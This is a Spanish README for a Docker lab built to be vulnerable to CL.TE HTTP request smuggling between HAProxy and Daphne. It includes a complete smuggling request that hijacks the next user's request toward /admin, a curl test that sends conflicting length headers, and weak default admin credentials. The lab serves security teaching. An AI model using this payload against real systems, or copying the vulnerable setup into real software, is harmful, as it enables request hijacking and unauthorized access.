# 🧪 Laboratorio HTTP Request Smuggling — CL.TE

## Arquitectura

```
Cliente HTTP
    │
    ▼
HAProxy :80          ← Frontend (usa Content-Length)
    │
    ├──/ws/*──────► Daphne :8001  (WebSocket)
    │
    └──/*─────────► Daphne :8000  (HTTP - vulnerable)
```

## ¿Por qué es vulnerable? (CL.TE)

| Actor    | Protocolo que prioriza |
|----------|------------------------|
| HAProxy  | `Content-Length`       |
| Daphne   | `Transfer-Encoding: chunked` |

Cuando una request llega con **ambos** headers, HAProxy la delimita
usando `Content-Length` y la reenvía completa al backend. Daphne,
al ver `Transfer-Encoding: chunked`, interpreta el cuerpo como chunked
y considera que los bytes "sobrantes" son el inicio de una nueva request.

---

## Levantar el lab

```bash
# Construir e iniciar
docker compose up --build

# Panel HAProxy stats
open http://localhost:8404/stats   # user: admin / pass: admin123
```

---

## Ejemplo de ataque CL.TE

Enviar esta request con **Burp Suite** o `curl --http1.1`:

```
POST / HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggled&x=
0

GET /admin HTTP/1.1
X-Ignore: X
```

### ¿Qué pasa?

1. **HAProxy** ve `Content-Length: 49` → lee exactamente 49 bytes → reenvía todo al backend.
2. **Daphne** ve `Transfer-Encoding: chunked` → lee el chunk `e` (14 bytes: `q=smuggled&x=`), luego el chunk `0` (fin) → los bytes restantes (`GET /admin HTTP/1.1\r\nX-Ignore: X`) quedan en el buffer de la conexión.
3. La **siguiente request legítima** de cualquier usuario se fusiona con ese prefijo envenenado → su request se convierte en `GET /admin HTTP/1.1`.

---

## Verificación rápida (smoke test)

```bash
# 1. Request normal (debería responder 200)
curl -v http://localhost/

# 2. Request con ambos headers (observar en logs de Django cómo llega)
curl -v --http1.1 \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 6" \
  -d "0\r\n\r\n" \
  http://localhost/
```

---

## Estructura de archivos

```
.
├── docker-compose.yml       ← Orquestación
├── Dockerfile               ← Imagen Django + Daphne
├── docker-entrypoint.sh     ← Arranca 2 instancias de Daphne
├── requirements.txt         ← Dependencias Python
├── haproxy/
│   └── haproxy.cfg          ← Config CL.TE (punto clave del lab)
└── README.md
```

---

## ⚠️ IMPORTANTE

> Este laboratorio es únicamente para fines educativos y de investigación de seguridad.
> Úsalo **solo** en entornos controlados. Nunca apliques estas técnicas en sistemas
> sin autorización explícita del propietario.

---

## Ajuste de la condición CL.TE

El comportamiento se controla en `haproxy/haproxy.cfg`.
Para hacer el lab **más o menos obvio**, puedes:

- **Más realista**: añadir `option http-pretend-keepalive` en el backend.
- **Para TE.CL invertido**: cambiar el orden de procesamiento en HAProxy con `option http-use-proxy-header`.
